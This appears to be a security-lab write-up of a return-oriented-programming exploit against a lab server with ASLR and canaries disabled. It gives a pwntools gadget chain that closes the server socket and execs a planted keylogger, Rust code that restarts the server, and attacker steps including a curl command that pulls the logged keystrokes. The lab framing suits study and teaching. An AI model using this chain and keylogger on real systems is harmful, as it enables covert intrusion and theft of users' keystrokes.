# <span style="color: yellow;">Scenario 2</span>

## Context
***
- server_data is <span style="color: green;">accessible</span>
- stack canaries are <span style="color: red;">disabled</span>
- DEP is <span style="color: green;">enabled</span>
- ASLR is <span style="color: red;">disabled</span>

## Exploit overview
***
DEP stops code injection but not code-reuse, so we will use Return-Oriented Programming. This exploit launches ./server_data.

## Challenges & Decisions
***
- We can rename the keylogger to a string already present in the binary, and retrieve the address of that string.

- The hardest part of this challenge lies in enabling the attacker to access the logged keyboard events after launching the keylogger:
    - __Strategy 1__: If we just launch the keylogger, the server dies, preventing the attacker to access the logged keyboard events. → we can't use strategy 1.
    - __Strategy 2__: If we launch the keylogger, we can revive the server by letting the keylogger execute ./server_sc2. The problem is that socket 8080 is still connected to the keylogger process. → We can't use strategy 2.
    - __Strategy 3__: We can launch the keylogger and revive the server by letting the keylogger execute ./server_sc2.  We can detach socket 8080 from the process: this can be done in the keylogger rust code itself, but we found enough gadgets to do it in the ROP chain

 → Strategy 3 is used.

### ROP Chain

The ROP chain consists of two steps:
1. Detatching the socket from the current process
2. Executing ./server_data with `sys_execve`

```shell
g1 = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
g2 = p64(rop.find_gadget(['pop rdx', 'pop rax', 'ret'])[0])
g3 = p64(rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0])
g4 = p64(rop.find_gadget(['syscall'])[0])

keylogger_adres = next(exe.search(b"./server_data"))

payload = [
    g1, p64(3),                # pop rdi (3), zet arg1 op 3 (server socket fd)
    g2, p64(0), p64(3),        # pop rdx; pop rax; ret, set rax to 3 (close)
    g4,                        # syscall, calls close(int fd), close(3)
    p64(0),                    # padding voor syscall routine, want geen ret na syscall
    g1, p64(keylogger_adres),  # pop rdi ("./server_data") zet rdi op address van "./server_data"
    g2, p64(0), p64(0x3b),     # clear rdx voor execve call en set rax op 0x3b (execve)
    g3, p64(0), p64(0),        # cleart rsi voor execve syscall
    g4                         # execve("./server_data", [], [])
]
```
### Keylogger Extension
The keylogger restarts scenario 2. Socket 8080 is detached so this works.
```rust
 if let Err(e) = std::env::set_current_dir("..") {
    eprintln!("directory change gefaald");
    return;
  }
  
  let output = Command::new("./server_sc2").spawn().unwrap();
  println!("Scenario herstarten");
  if let Err(e) = std::env::set_current_dir("./server_data") {
      eprintln!("terug in server_data gaan gefaald");
      return;
  }
```

The attacker can access the logged keyboard events now.

## Execution Instructions
***
Victim-side:
```shell
$ sudo ./launch_scenario 2
```
```shell
$ sudo cp keylogger server/server_data/server_data  
```
Attacker-side:
Make sure server_sc2 binary is in the same directory as the exploit.
```shell
$ python3 server_sc2.py TARGET_IP TARGET_PORT
```
```shell
$ curl http://{TARGET}:{TARGET_PORT}/logged_keyboard_events.txt
```

## Preventive Measures
***
- ASLR makes ROP harder, but it does not prevent it since the attacker can get a leak with the POST vulnerability.